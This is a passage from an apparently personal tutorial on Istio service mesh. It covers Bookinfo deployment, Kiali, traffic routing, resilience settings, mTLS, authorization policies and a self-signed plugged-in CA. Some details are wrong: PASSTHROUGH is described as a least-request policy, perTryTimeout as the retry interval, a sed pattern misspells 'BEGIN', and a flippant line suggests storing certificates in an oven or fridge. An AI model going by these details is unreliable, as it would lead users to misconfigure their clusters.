need different profiles. Once Istio is installed, it is deployed in the cluster in the form of a deployment named istiod in the namespace known as the istio-system . services istio-ingressgateway isitod Citadel Pilot Galley istio-egressgateway and a bunch of Kubernetes service objects to expose these services within the cluster. Deploying Your First Application on Istio \u00b6 Deploy the sample booking deployment kubectl apply -f istio-1.14.1/samples/bookinfo/platform/kube/bookinfo.yaml The output is similar to this: service/details created serviceaccount/bookinfo-details created deployment.apps/details-v1 created service/ratings created serviceaccount/bookinfo-ratings created deployment.apps/ratings-v1 created service/reviews created serviceaccount/bookinfo-reviews created deployment.apps/reviews-v1 created deployment.apps/reviews-v2 created deployment.apps/reviews-v3 created service/productpage created serviceaccount/bookinfo-productpage created deployment.apps/productpage-v1 created Check all the deployment kubectl get pod The output is similar to this: NAME READY STATUS RESTARTS AGE details-v1-7f4669bdd9-q72n9 1 /1 Running 0 3m2s productpage-v1-5586c4d4ff-lghxl 1 /1 Running 0 3m ratings-v1-6cf6bc7c85-sv8sf 1 /1 Running 0 3m1s reviews-v1-7598cc9867-gt8zn 1 /1 Running 0 3m1s reviews-v2-6bdd859457-thjrq 1 /1 Running 0 3m1s reviews-v3-6c98f9d7d7-z8qf6 1 /1 Running 0 3m1s We have the deployments in the default namespace but there are no proxies that we needs in each of deployment To see why may be the case istioctl analyze The output is similar to this: Info [ IST0102 ] ( Namespace default ) The namespace is not enabled for Istio injection. Run 'kubectl label namespace default istio-injection=enabled' to enable it, or 'kubectl label namespace default istio-injection=disabled' to explicitly mark it as not needing injection. Because the default namespace where our deployment deployed is not labeled with istio-injection=enable, so we need to delete all the deployment to label the namespace kubectl label namespace default istio-injection = enabled The output is similar to this: namespace/default labeled Check/analyze again istioctl analyze The output is similar to this: \u2714 No validation issues found when analyzing namespace: default. Delete or restart rollout deployment kubectl rollout restart deployments details-v1 kubectl rollout restart deployments productpage-v1 kubectl rollout restart deployments ratings-v1 kubectl rollout restart deployments reviews-v1 kubectl rollout restart deployments reviews-v2 kubectl rollout restart deployments reviews-v3 The output is similar to this: deployment.apps/details-v1 restarted deployment.apps/productpage-v1 restarted deployment.apps/ratings-v1 restarted deployment.apps/reviews-v1 restarted deployment.apps/reviews-v2 restarted deployment.apps/reviews-v3 restarted Check all the deployment ```sh kubectl get pod The output is similar to this: ```sh NAME READY STATUS RESTARTS AGE details-v1-7fd8c8d8c-kw8cx 2/2 Running 0 58s productpage-v1-7444985f97-5hnt6 2/2 Running 0 57s ratings-v1-5bd97d8566-qwmw8 2/2 Running 0 57s reviews-v1-74cffbcd7d-x88hn 2/2 Running 0 57s reviews-v2-6746555c8b-d4rrj 2/2 Running 0 56s reviews-v3-85cb57875d-z6w5m 2/2 Running 0 56s Visualizing Service Mesh with Kiali \u00b6 Once you have many microservices, it is important to observe them and check them to make sure they're available as you configured them. Kiali is a very common and powerful add-on used with Istio. It has a web-based graphical interface. It is a very helpful and fun tool for visualizing and managing service mesh. Kiali is used for observing connections and microservices of Istio service mesh and also for defining and validating them. It visualizes the service mesh topology and provides visibility into features like request routing, circuit breakers, request rates, latency and more. Kiali also offers Wizards to apply common traffic patterns and automatically generates Istio configuration. Installing Kiali \u00b6 Install Kiali and others add-on in the samples/addons folder (these addons are not tuned in performance and security purposes) ls samples/addons kubectl apply -f samples/addons The output is similar to this: README.md extras grafana.yaml jaeger.yaml kiali.yaml prometheus.yaml serviceaccount/grafana created configmap/grafana created service/grafana created deployment.apps/grafana created configmap/istio-grafana-dashboards created configmap/istio-services-grafana-dashboards created deployment.apps/jaeger created service/tracing created service/zipkin created service/jaeger-collector created serviceaccount/kiali created configmap/kiali created clusterrole.rbac.authorization.k8s.io/kiali-viewer created clusterrole.rbac.authorization.k8s.io/kiali created clusterrolebinding.rbac.authorization.k8s.io/kiali created role.rbac.authorization.k8s.io/kiali-controlplane created rolebinding.rbac.authorization.k8s.io/kiali-controlplane created service/kiali created deployment.apps/kiali created serviceaccount/prometheus created configmap/prometheus created clusterrole.rbac.authorization.k8s.io/prometheus created clusterrolebinding.rbac.authorization.k8s.io/prometheus created service/prometheus created deployment.apps/prometheus created Check if the Kiali service is running kubectl -n istio-system get svc kiali The output is similar to this: NAME TYPE CLUSTER-IP EXTERNAL-IP PORT ( S ) AGE kiali ClusterIP 10 .99.20.194 <none> 20001 /TCP,9090/TCP 67m Start Kiali dashboard istioctl dashboard kiali The output is similar to this: http://localhost:20001/kiali Create traffic into your mesh \u00b6 Gateway will configure our service mesh to accept traffic from outside the cluster. Create a Gateway and its virtual service kubectl apply -f samples/bookinfo/networking/bookinfo-gateway.yaml The output is similar to this: gateway.networking.istio.io/bookinfo-gateway created virtualservice.networking.istio.io/bookinfo created Check/analyze again istioctl analyze The output is similar to this: \u2714 No validation issues found when analyzing namespace: default. Check the reachable IP of minikube - this is the minukube node Internal-IP kubectl get node -o wide The output is similar to this: NAME STATUS ROLES AGE VERSION INTERNAL-IP EXTERNAL-IP OS-IMAGE KERNEL-VERSION CONTAINER-RUNTIME minikube Ready control-plane,master 31m v1.23.1 192 .168.49.2 <none> Ubuntu 20 .04.2 LTS 5 .10.76-linuxkit docker://20.10.12 Export this IP to our variable export INGRESS_HOST = $( minikube ip ) Export the istio-ingressgateway (http2) port to our variable export INGRESS_PORT = $( kubectl -n istio-system get svc istio-ingressgateway -o jsonpath = '{.spec.ports[?(@.name==\"http2\")].nodePort}' ) Create some traffic to our mesh while sleep 0 .01 ; do curl -sS 'http://' \" $INGRESS_HOST \" ':' \" $INGRESS_PORT \" '/productpage' \\ & > /dev/null ; done Traffic Management \u00b6 The most powerful port of it is that you'll do it without changing your application code Gateways \u00b6 How can we make these services accessible to external users? While Istio supports Kubernetes Ingress there is also another approach that Istio offers and recommends that supports more Istio features, such as advanced monitoring and routing rules. That is called Istio Gateway. Gateways are load balancers that sit at the edge of the mesh. They are the main configurations that manage the inbound and the outbound traffic to service mesh. This is a recommended approach such as compared to just using Kubernetes Ingress. There are Istio gateway controllers just like the Ingress Controller: The Ingress Gateway manages all inbound traffic to the services. The Egress Gateway manages all outbound traffic from these services. Ingress is deployed in Kubernetes using controllers like NGINX. Istio on the other hand, deploys Ingress Gateways using Envoy proxies. And all services have an Envoy proxy deployed as a sidecar container, however, the Ingress and Egress Gateways are just standalone Envoy proxies, sitting at the edge of the service mesh, they do not work as as sidecar. These are the default gateway controllers that were deployed when Istio was deployed on the cluster. However, we can have our own set of custom gateway controllers as well. Our goal here is to catch all traffic coming through istio-ingressgateway controller and route all traffic at hostname bookinfo.app to our product page. First, we create a gateway object cat <<EOF | kubectl apply -f - apiVersion: networking.istio.io/v1alpha3 kind: Gateway metadata: name: bookinfo-gateway spec: selector: istio: ingressgateway # use istio default controller servers: - port: number: 80 name: http protocol: HTTP hosts: - \"bookinfo.app\" EOF View the gateway kubectl get gateway The output is similar to this: NAME AGE bookinfo-gateway 29s Describe more details the gateway kubectl describe gateway bookinfo-gateway The output is similar to this: Name: bookinfo-gateway Namespace: default Labels: <none> Annotations: <none> API Version: networking.istio.io/v1beta1 Kind: Gateway Metadata: Creation Timestamp: 2022 -07-07T02:24:05Z Generation: 1 Managed Fields: API Version: networking.istio.io/v1alpha3 Fields Type: FieldsV1 fieldsV1: f:metadata: f:annotations: .: f:kubectl.kubernetes.io/last-applied-configuration: f:spec: .: f:selector: .: f:istio: f:servers: Manager: kubectl-client-side-apply Operation: Update Time: 2022 -07-07T02:24:05Z Resource Version: 1237 UID: 40b636a4-88ea-4cd9-9294-accd8ce38bfa Spec: Selector: Istio: ingressgateway Servers: Hosts: bookinfo.app Port: Name: http Number: 80 Protocol: HTTP Events: <none> We now have a bookinfo-gateway object created to capture traffic coming through the default istio-ingressgateway controller, through the URL bookinfo.app. Virtual Services \u00b6 How and where is that traffic routed to? All routing rules are configured through virtual services. Virtual services define a set of routing rules for traffic coming from ingress gateway into the service mesh. Virtual services are flexible and powerful with rich traffic routing options. You can specify traffic behavior for one or more hostname, manage traffic within different versions of a service. Standard and regex path are supported. When a virtual service is created, Istio control plane applies the new configuration to all the Envoy sidecar proxies. Create a virtual service for product page: cat <<EOF | kubectl apply -f - apiVersion: networking.istio.io/v1alpha3 kind: VirtualService metadata: name: bookinfo spec: hosts: - \"bookinfo.app\" gateways: - bookinfo-gateway http: - match: - uri: exact: /productpage - uri: prefix: /static - uri: exact: /login - uri: exact: /logout - uri: prefix: /api/v1/products route: - destination: host: productpage port: number: 9080 EOF All traffic coming in through the bookinfo-gateway with the hostname bookinfo.app now hit the bookinfo virtual service. Next, the product page needs to talk to the review service. Since the Kubernetes service distributes traffic across all of endpoints equally, the distribution can only be 75 and 25 percentage not anything else. The only way to change the distribution percentage is to play around with the number of pods available in different services, so that's a limitation. With Istio and virtual services, we can now create a virtual service instead of a service, and we will call it reviews , we then define two destination routes for traffic distribution subset v1 and v2, then we set a weight for each. cat <<EOF | kubectl apply -f - apiVersion: networking.istio.io/v1alpha3 kind: VirtualService metadata: name: reviews spec: hosts: - reviews http: - route: - destination: host: reviews subset: v1 weight: 99 # route 99% of the traffic to v1 - destination: host: reviews subset: v2 weight: 1 # route 1% of the traffic to v2 EOF Destination Rules \u00b6 Destination rule applies router polices after the traffic is routed to a specific service. Where and how are these subsets defined? Subsets are defined in destination rules. So, we create a destination rule with the kind set to DestinationRule, name set to reviews-destination, and host set to reviews. cat <<EOF | kubectl apply -f - apiVersion: networking.istio.io/v1alpha3 kind: DestinationRule metadata: name: reviews-destination spec: host: reviews subsets: - name: v1 labels: version: v1 - name: v2 labels: version: v2 EOF By default, Envoy load balances traffic in a round-robin fashion. This can be customized through the destination rule by specifying a traffic policy of load balancer. cat <<EOF | kubectl apply -f - apiVersion: networking.istio.io/v1alpha3 kind: DestinationRule metadata: name: reviews-destination spec: host: reviews trafficPolicy: loadBalancer: simple: PASSTHROUGH # This will route traffic to the host that has fewer active requests. subsets: - name: v1 labels: version: v1 - name: v2 labels: version: v2 EOF Set the traffic policy to a simple passthrough policy. This will route traffic to the host that has fewer active requests. There are other simple algorithms: Simple Algorithms ROUND_ROBIN LEAST_CONN RANDOM PASSTHROUGH What if we want to override a different load balancer policy for specific subsets? For example, for subset v2, we would like to have a random load balancer policy. For this, we'll just specify a traffic policy at the subset level and configure a different policy. This way, we can configure one load balancing policy for all subsets and a seperate one for selected subsets as required. cat <<EOF | kubectl apply -f - apiVersion: networking.istio.io/v1alpha3 kind: DestinationRule metadata: name: reviews-destination spec: host: reviews trafficPolicy: loadBalancer: simple: PASSTHROUGH subsets: - name: v1 labels: version: v1 - name: v2 labels: version: v2 trafficPolicy: loadBalancer: simple: RANDOM EOF There are many more configurations supported by destination rules. For example, to configure a client to use TLS, specify simple TLS, or to configure mutual TLS cat <<EOF | kubectl apply -f - apiVersion: networking.istio.io/v1alpha3 kind: DestinationRule metadata: name: reviews-destination spec: host: reviews trafficPolicy: tls: mode: SIMPLE # use simple TLS EOF cat <<EOF | kubectl apply -f - apiVersion: networking.istio.io/v1alpha3 kind: DestinationRule metadata: name: reviews-destination spec: host: reviews trafficPolicy: tls: mode: MUTUAL # configure mutual TLS with certificate files clientCertificate: /myclientcert.pem privateKey: /client_private_key.pem caCertificate: /rootcacerts.pem EOF spec.host field it is currently set to reviews , which is the name of the service. It is the short name of the service. When using short names, instead of fully qualified domain names reviews.default.svc.cluster.local , Istio will interpret the short name based on the rules namespace and not the services actual namespaces. This might lead to misconfigurations if your service is another namespace. To avoid this, using fully qualified names over short names is recommended. cat <<EOF | kubectl apply -f - apiVersion: networking.istio.io/v1alpha3 kind: DestinationRule metadata: name: reviews-destination spec: host: reviews.default.svc.cluster.local # recommend to use FQDN instead of short name trafficPolicy: tls: mode: MUTUAL clientCertificate: /myclientcert.pem privateKey: /client_private_key.pem caCertificate: /rootcacerts.pem EOF Fault Injection \u00b6 We will generate some errors to check if error handling mechanisms are working as expected. That is fault injection. This is a testing approach. It helps us to see if our policies run efficiently and are not too restrictive. We can inject errors in our virtual services and these could be two different types of errors, delays and aborts. cat <<EOF | kubectl apply -f - apiVersion: networking.istio.io/v1alpha3 kind: VirtualService metadata: name: my-service spec: hosts: - my-service http: - fault: delay: # injecting a delay type of fault in the mesh for ratings virtual service percentage: value: 0.1 # add a delay for 10% of requests fixedDelay: 5s # this delay is configured as 5 seconds route: - destination: host: my-service subset: v1 EOF Apart from delay, you can also configure abort to simulate errors by rejecting requests and returning specific error codes. cat <<EOF | kubectl apply -f - apiVersion: networking.istio.io/v1alpha3 kind: VirtualService metadata: name: my-service spec: hosts: - my-service http: - fault: abort: percentage: value: 0.1 httpStatus: 400 route: - destination: host: my-service subset: v1 EOF Timeouts \u00b6 When it comes to software, you must know that anything could happen. Since each service within this microservice architecture is a software, we should expect them to slow down, fail, or go completely crazy for no obvious reasons. And since the services are dependent on each other, slowness on one service might affect the other services dependent on it and even have a cascading effect. For example: If the ratings service slows down for some reason, we will have requests queued at it, which is going to cause requests on the reviews service to be queued up, which is going to cause the requests on productpage to be queued up. The details service slows down, then the requests coming from product page to details service is going to get queued up, and the request sub-productpage is going to get queued up affecting all users accessing the application. That's why we need timeouts. If the service is taking too much time to response, it must not keep the dependent service waiting forever. It must fail after a period of time and return an error message. That way the dependent service gets an error message and is not impacted. That's what a timeout is. We can either configure a timeout at the details service for it to fail, or we can configure a timeout at the productpage service for it to fail sooner rather than waiting for the details service for eternity. cat <<EOF | kubectl apply -f - apiVersion: networking.istio.io/v1alpha3 kind: VirtualService metadata: name: bookinfo spec: hosts: - \"*\" gateways: - bookinfo-gateway http: - match: - uri: exact: /productpage - uri: prefix: /static - uri: exact: /login - uri: exact: /logout - uri: prefix: /api/v1/products route: - destination: host: productpage port: number: 9080 timeout: 3s # reject requests if it takes more than 3 seconds EOF Simulate the fault injection to set 50% of request to details service to be delayed 5 seconds cat <<EOF | kubectl apply -f - apiVersion: networking.istio.io/v1alpha3 kind: VirtualService metadata: name: details spec: hosts: - details http: - fault: delay: percentage: value: 50.0 fixedDelay: 5s route: - destination: host: details subset: v1 EOF Retries \u00b6 When a service tries to reach another service, and for some reason, it fails, we can configure the virtual service to attempt that operation again. This way, you don't have to handle the retries within the application code. You can configure retry settings, which basically says cat <<EOF | kubectl apply -f - apiVersion: networking.istio.io/v1alpha3 kind: VirtualService metadata: name: my-service spec: hosts: - my-service http: - route: - destination: host: my-service subset: v1 retries: attempts: 3 # number of times to try perTryTimeout: 2s # interval between each try EOF NOTE : Istio, by default, has a retry behavior which is 25 milliseconds between retries and retrying 2 times before an error returns. Circuit Breaking \u00b6 The productpage service communicates with other services such as the reviews or the details service. If, for some reason, the details service breaks or slows down and is unable to serve the product service, all requests from the productpage service will pile up at the detail service, essentially creating a delay as the productpage service is waiting for response from the detail service. In such cases, we would like to mark the requests failed immediately as it is sent to the details service. This is known as circuit breaking. This allows us to create resilient microservice applications that will limit the impact of failures or other network-related issues. The same is true if we would like to limit the number of request coming to the productpage itself. Circuit breakers are configured in destination rules. cat <<EOF | kubectl apply -f - apiVersion: networking.istio.io/v1alpha3 kind: DestinationRule metadata: name: productpage spec: host: productpage trafficPolicy: tls: mode: ISTIO_MUTUAL subsets: - name: v1 labels: version: v1 trafficPolicy: connectionPool: tcp: maxConnections: 3 # limit the number of concurrent connections to 3 http: http1MaxPendingRequests: 3 maxRequestsPerConnection: 3 EOF Create concurrent requests h2load -n10 -c3 http://istio.dev.bein.group/productpage The output is similar to this: starting benchmark... spawning thread #0: 3 total client(s). 10 total requests Application protocol: h2c progress: 10 % done progress: 20 % done progress: 30 % done progress: 40 % done progress: 50 % done progress: 60 % done progress: 70 % done progress: 80 % done progress: 90 % done progress: 100 % done finished in 9 .65s, 1 .04 req/s, 1 .40KB/s requests: 10 total, 10 started, 10 done , 3 succeeded, 7 failed, 0 errored, 0 timeout status codes: 3 2xx, 0 3xx, 0 4xx, 7 5xx traffic: 13 .55KB ( 13876 ) total, 454B ( 454 ) headers ( space savings 59 .61% ) , 12 .74KB ( 13050 ) data min max mean sd +/- sd time for request: 323 .12ms 3 .18s 2 .27s 1 .32s 70 .00% time for connect: 45 .68ms 46 .04ms 45 .83ms 187us 66 .67% time to 1st byte: 3 .09s 3 .10s 3 .09s 685us 66 .67% req/s : 0 .41 0 .46 0 .44 0 .02 66 .67% A/B Testing \u00b6 A/B Testing is a very popular and powerful approach to understand user behavior. It boosts experimentation and helps our software professionals to not guess how our applications will be interacted, but to see it on real data. Istio allows to weight the traffic to several services via virtual service even if the reviews v2 service had 3 or more pods, the traffic distribution will still be 99% to v1 and 1% to v2. The number of instances now has nothing to do with the traffic distribution, and we can easily control that through the virtual service configuration. Security \u00b6 Security in Istio \u00b6 Microservices have certain security requirements. When a service communicates with other service, it's possible for an attacker to intercept the traffic and modify it before the request reaches the destination. This is known as man-in-the-middle attack. To prevent this from happening: First, the traffic between services needs to be encrypted. Secondly, certain services may need to implement access control restrictions. For example, only the productpage service is allowed to access the reviews service and not the details service or any other services in the cluster. For this, we need access control. Istio allows this using mutual TLS and fine-grained access policies. Finally, we'd like to know who did what at what time. And for this, Istio provides support for audits logs. Istio Security Architecture \u00b6 Now take a look at the Istio architecture and see how Istio implements security to achieve the requirements of microservices applications. Control plane Istiod There is a certification authority that manages keys and certificates in Istio. This is where the certificates are validated and certificate signing requests are approved. Every time a workload is started, the Envoy proxies request the certificate and key from the Istio agent and that helps secure communication between services. The configuration API server component distributes all the authentication, authorization, and secure naming policies to the proxies. Data plane Sidecar and ingress/egress proxies work as Policy Enforcement Points. The certificate, keys, authentications, authorization, and secure naming policies are sent to these proxies at all times. This means every point has security checks, not just the entry point to the network, and this is called security at depth. Authentication \u00b6 In service-oriented architecture, we need to make sure that communication between two services are authenticated.Meaning, when a service tries to communicate with another service, there should be a way to confirm they're really who they say they are. This is done by hardening traffic using verification options like mutual TLS and JSON Web Token validation. For example, when the productpage service tries to reach the reviews service, the reviews services needs to know that the request is actually coming from the productpage service and not from an external source who pretends to be the productpage service, so the traffic between one service to the other needs to be verified. With mTLS, each service gets its own identity Peer Authentication , which is enforced using certificate key pairs. This certificate generation and distribution are all managed automatically by istiod . So there's nothing extra that you have to do on the services. Another area to be authenticated is the end users' access to services. For this, Istio supports Request Authentication using JSON Web Token validation or OpenID Connect providers some of which are: ORY Hydra Keycloak Firebase Google Example for Peer Authentication config, this policy in the book-info namespace and only be effective on workloads labeled with the key app and value set to reviews, and say that these workloads must strictly use Mutual TLS. In this case, we have enabled authentication only for the reviews app, and so we have only enabled it for a single workload. This is a workload-specific policy. cat <<EOF | kubectl apply -f - apiVersion: security.istio.io/v1beta1 kind: PeerAuthentication metadata: name: peer-policy namespace: book-info spec: selector: matchLabels: app: reviews # only effective on workload with this label mtls: mode: STRICT # strictly use Mutual TLS EOF If you remove the selector specification, the policy will be enabled for the entire namespace, so then this would be a namespace-wide policy that is applied to all workloads within the book-info namespace cat <<EOF | kubectl apply -f - apiVersion: security.istio.io/v1beta1 kind: PeerAuthentication metadata: name: peer-policy namespace: book-info spec: mtls: mode: STRICT # strictly use Mutual TLS for entire namespace EOF If we set the namespace to the root namespace istio-system so then this become a mesh-wide policy that is applicable to the entire mesh. cat <<EOF | kubectl apply -f - apiVersion: security.istio.io/v1beta1 kind: PeerAuthentication metadata: name: peer-policy namespace: isito-system # this is the mesh-wide policy spec: mtls: mode: STRICT EOF If your namespace is not injection enabled, you still can manual inject Istio proxy sidecars to deployment, but manual injection will change the deployment configuration by adding proxy configuration into it. So it works a little differently. # Update resources on the fly before applying. kubectl apply -f < ( istioctl kube-inject -f <resource.yaml> ) # Create a persistent version of the deployment with Istio sidecar injected. istioctl kube-inject -f deployment.yaml -o deployment-injected.yaml # Update an existing deployment. kubectl get deployment -o yaml | istioctl kube-inject -f - | kubectl apply -f - Demo Peer Authentication, workloads that do not apply the same mode cannot reach our application. Create new namespace bar kubectl create ns bar The output is similar to this: namespace/bar created Manual inject Istio proxy sidecars into HTTPbin deployment and deploy kubectl apply -f < ( istioctl kube-inject -f samples/httpbin/httpbin.yaml ) -n bar The output is similar to this: serviceaccount/httpbin created service/httpbin created deployment.apps/httpbin created Curl from HTTPbin to the productpage kubectl exec -it \" $( kubectl get pod -l app = httpbin -n bar -o jsonpath ={ .items..metadata.name } ) \" -c istio-proxy -n bar -- curl \"http://productpage.default:9080\" -s -o /dev/null -w \"%{http_code}\\n\" The output is similar to this: 200 Apply the Peer Authentication for default namespace mTLS mode strict cat <<EOF | kubectl apply -f - apiVersion: security.istio.io/v1beta1 kind: PeerAuthentication metadata: name: peer-policy namespace: default spec: mtls: mode: STRICT EOF The output is similar to this: peerauthentication.security.istio.io/peer-policy created Curl from HTTPbin to the productpage again kubectl exec -it \" $( kubectl get pod -l app = httpbin -n bar -o jsonpath ={ .items..metadata.name } ) \" -c istio-proxy -n bar -- curl \"http://productpage.default:9080\" -s -o /dev/null -w \"%{http_code}\\n\" The output is similar to this: 000 command terminated with exit code 56 Authorization \u00b6 Authorization in Istio provides a flexible approach to access control for inbound traffic. We can control which service can reach which service, which is referred to as east-west traffic using authorization configuration. With authentication policies, we now have the end-user traffic as well as service-to-service traffic secured. What about access control? For example, we would like to only allow the productpage service to access the reviews service and not the details or any other services. Also, the productpage service is only supposed to run GET calls to reviews service and not POST or UPDATE calls. We do not want anyone gaining access to the productpage service to make POST calls to the reviews service in an attempt to update or change reviews. And for this purpose, Istio provides authorization mechanisms that allow us to define policies to allow or deny requests based on certain criteria. These services don't require any changes to implement authorization. This is implemented by Envoy proxies authorization engine in runtime. When a request comes through the proxy, the authorization engine evaluates the request context against the current authorization policies and returns the authorization result either allow or deny. There are 4 actions that authorization policies support, CUSTOM, DENY, ALLOW, and AUDIT: ALLOW action allows a request to go through. DENY action denies a request from going through. CUSTION action allows an extension to handle the request. AUDIT action - Authorization policies can also be configured to audit requests. With this option, when a request hits the matching rule, it gets audited. Example of an authorization policy: cat <<EOF | kubectl apply -f - apiVersion: security.istio.io/v1beta1 kind: AuthorizationPolicy metadata: name: authdenypolicy namespace: bookinfo spec: action: DENY # this policy deines all POST requests from the bar namespace to the bookinfo namespace rules: - from: - source: namespace: [\"bar\"] to: - operation: methods: [\"POST\"] EOF Certificate Management \u00b6 This is a diagram of key and certification flow in Istio, so when a service is started, it needs to identify itself to the mesh control plane and retrieve a certificate in order to serve traffic. Istio only has a built-in certificate authority. The Istio agent in a service creates a private key and a certificate signing request, and then sends the certificate signing request with its credentials to istiod for signing. The CA in istiod validates the credentials carried in the CSR. Upon successful validation, it signs the CSR to generate the certificate. The Istio agent sends the certificates received from istiod and the private key to Envoy proxy Istio agent monitors the expiration of the workload certificate. The above process repeats periodically for certificates and key rotation. It is important to note that for production-grade clusters, you should use a production-ready CA such as HashiCorp Vault and put your certificates in an oven machine or the fridge. Create our own root certificate cd ~/DevSecOps/demo/istio/istio-1.14.1 mkdir ca-certs cd ca-certs make -f ../tools/certs/Makefile.selfsigned.mk root-ca The output is similar to this: generating root-key.pem Generating RSA private key, 4096 bit long modulus .................++ ...................................................................................................................................................................................................................++ e is 65537 ( 0x10001 ) generating root-cert.csr generating root-cert.pem Signature ok subject = /O = Istio/CN = Root CA Getting Private key Here are 4 files that are generated with above command ls The output is similar to this: root-ca.conf root-cert.csr root-cert.pem root-key.pem root-ca.conf is the configuration for OpenSSL to generate the root certificate. root-cert.csr is a generated CSR for the root certificate. root-cert.pem is a generated root certificate. root-key.pem is a generated root key. Now we will create our immediate certificates. make -f ../tools/certs/Makefile.selfsigned.mk localcluster-cacerts The output is similar to this: generating localcluster/ca-key.pem Generating RSA private key, 4096 bit long modulus ........................................................................................................................................................................................................................................................................................................................++ .++ e is 65537 ( 0x10001 ) generating localcluster/cluster-ca.csr generating localcluster/ca-cert.pem Signature ok subject = /O = Istio/CN = Intermediate CA/L = localcluster Getting CA Private Key generating localcluster/cert-chain.pem Intermediate inputs stored in localcluster/ done rm localcluster/cluster-ca.csr localcluster/intermediate.conf Root certificates should not be used directly, because it is very dangerous, and also not very practical to use them. Above they are also created cd localcluster ls The output is similar to this: ca-cert.pem ca-key.pem cert-chain.pem root-cert.pem Important: you need to delete if you pre-installed Istio, or at least delete the istio-system namespace to configure Istio to use our certificate. kubeclt delete ns istio-system The output is similar to this: namespace \"istio-system\" deleted Then you can as well start with a fresh cluster cd ../../ ./samples/bookinfo/platform/kube/cleanup.sh The output is similar to this: namespace ? [ default ] using NAMESPACE = default destinationrule.networking.istio.io \"details\" deleted destinationrule.networking.istio.io \"productpage\" deleted destinationrule.networking.istio.io \"ratings\" deleted destinationrule.networking.istio.io \"reviews\" deleted virtualservice.networking.istio.io \"bookinfo\" deleted gateway.networking.istio.io \"bookinfo-gateway\" deleted Application cleanup may take up to one minute service \"details\" deleted serviceaccount \"bookinfo-details\" deleted deployment.apps \"details-v1\" deleted service \"ratings\" deleted serviceaccount \"bookinfo-ratings\" deleted deployment.apps \"ratings-v1\" deleted service \"reviews\" deleted serviceaccount \"bookinfo-reviews\" deleted deployment.apps \"reviews-v1\" deleted deployment.apps \"reviews-v2\" deleted deployment.apps \"reviews-v3\" deleted service \"productpage\" deleted serviceaccount \"bookinfo-productpage\" deleted deployment.apps \"productpage-v1\" deleted Application cleanup successful Now let's create istio-system namespace again kubectl create ns istio-system The output is similar to this: namespace/istio-system created Then create a secret to include all these certificates cd ca-certs/localcluster/ kubectl create secret generic cacerts -n istio-system \\ --from-file = ca-cert.pem \\ --from-file = ca-key.pem \\ --from-file = root-cert.pem \\ --from-file = cert-chain.pem The output is similar to this: secret/cacerts created Here, we'll install Istio back again, so that Istio certificate authority will read the certificates and key from the secret mount files. istioctl install --set profile = demo The output is similar to this: We can also get our Kiali, Grafana, Prometheus all back cd ../../ kubectl apply -f samples/addons The output is similar to this: serviceaccount/grafana created configmap/grafana created service/grafana created deployment.apps/grafana created configmap/istio-grafana-dashboards created configmap/istio-services-grafana-dashboards created deployment.apps/jaeger created service/tracing created service/zipkin created service/jaeger-collector created serviceaccount/kiali created configmap/kiali created clusterrole.rbac.authorization.k8s.io/kiali-viewer created clusterrole.rbac.authorization.k8s.io/kiali created clusterrolebinding.rbac.authorization.k8s.io/kiali created role.rbac.authorization.k8s.io/kiali-controlplane created rolebinding.rbac.authorization.k8s.io/kiali-controlplane created service/kiali created deployment.apps/kiali created serviceaccount/prometheus created configmap/prometheus created clusterrole.rbac.authorization.k8s.io/prometheus created clusterrolebinding.rbac.authorization.k8s.io/prometheus created service/prometheus created deployment.apps/prometheus created Deploy the sample booking deployment kubectl apply -f istio-1.14.1/samples/bookinfo/platform/kube/bookinfo.yaml The output is similar to this: service/details created serviceaccount/bookinfo-details created deployment.apps/details-v1 created service/ratings created serviceaccount/bookinfo-ratings created deployment.apps/ratings-v1 created service/reviews created serviceaccount/bookinfo-reviews created deployment.apps/reviews-v1 created deployment.apps/reviews-v2 created deployment.apps/reviews-v3 created service/productpage created serviceaccount/bookinfo-productpage created deployment.apps/productpage-v1 created Create a Gateway and its virtual service kubectl apply -f samples/bookinfo/networking/bookinfo-gateway.yaml The output is similar to this: gateway.networking.istio.io/bookinfo-gateway created virtualservice.networking.istio.io/bookinfo created Create destination rules kubectl apply -f samples/bookinfo/networking/destination-rule-all.yaml The output is similar to this: destinationrule.networking.istio.io/productpage created destinationrule.networking.istio.io/reviews created destinationrule.networking.istio.io/ratings created destinationrule.networking.istio.io/details created Check/analyze Istio istioctl analyze The output is similar to this: \u2714 No validation issues found when analyzing namespace: default Now, let's deploy a policy for our workloads to only accept mTLS traffic, strict mode here identifies that. cat <<EOF | kubectl apply -f - apiVersion: security.istio.io/v1beta1 kind: PeerAuthentication metadata: name: default spec: mtls: mode: STRICT EOF The output is similar to this: peerauthentication.security.istio.io/default created Now, we will check if the workloads are signed with the exact same certificate that we just plugged in. When we're trying to connect the productpage kubectl exec \" $( kubectl get pod -l app = details -o jsonpath ={ .items..metadata.name } ) \" -c istio-proxy -- openssl s_client -showcerts -connect productpage:9080 > httpbin-proxy-cert.txt The output is similar to this: depth = 2 O = Istio, CN = Root CA verify error:num = 19 :self signed certificate in certificate chain DONE As the CA certificate used in this example is self-signed, the verify error:num=19:self signed certificate in certificate chain error returned by the openssl command is expected Now, here in the TXT file we have the certificates and we'll clear the rest of the certificate details with the sed command. sed -ne '/-----BEIN CERTIFICATE-----/,/-----END CERTIFICATE-----/p' httpbin-proxy-cert.txt | sed 's/^\\s*//' > certs.pem Let's check the certs.pem to see the certificates extracted from the traffic between 2 services. cat certs.pem Now, with split , we can split these into 4 different files. split -p \"-----BEGIN CERTIFICATE-----\" certs.pem proxy-cert- Now, we will verify if the root certificate is the same as the one we specified. openssl x509 -in ca-certs/localcluster/root-cert.pem -text -noout > /tmp/root-cert.crt.txt The second command will dump certificate information of the one we just extracted from the traffic itself. openssl x509 -in ./proxy-cert-3.pem -text -noout > /tmp/pod-root-cert.crt.txt Let's check if these match diff -s /tmp/root-cert.crt.txt /tmp/pod-root-cert.crt.txt The output is similar to this: Files /tmp/root-cert.crt.txt and /tmp/pod-root-cert.crt.txt are identical Same to verify the CA certificate is the same openssl x509 -in ca-certs/localcluster/ca-cert.pem -text -noout > /tmp/ca-cert.crt.txt openssl x509 -in ./proxy-cert-2.pem -text -noout > /tmp/pod-cert-chain-ca.crt.txt diff -s /tmp/ca-cert.crt.txt /tmp/pod-cert-chain-ca.crt.txt The output is similar to this: Files /tmp/ca-cert.crt.txt and /tmp/pod-cert-chain-ca.crt.txt are identical Let's also verify the certificate chain from the root certificate to the workload certificate. openssl verify -CAfile < ( cat ca-certs/localcluster/ca-cert.pem ca-certs/localcluster/root-cert.pem ) ./proxy-cert-1.pem The output is similar to this: ./proxy-cert-1.pem OK Observability \u00b6 How to collect and customize telemetry information from our mesh. Istio has advantage in terms of observability because all of the traffic is handled by Envoy proxies in the data plane. Your service 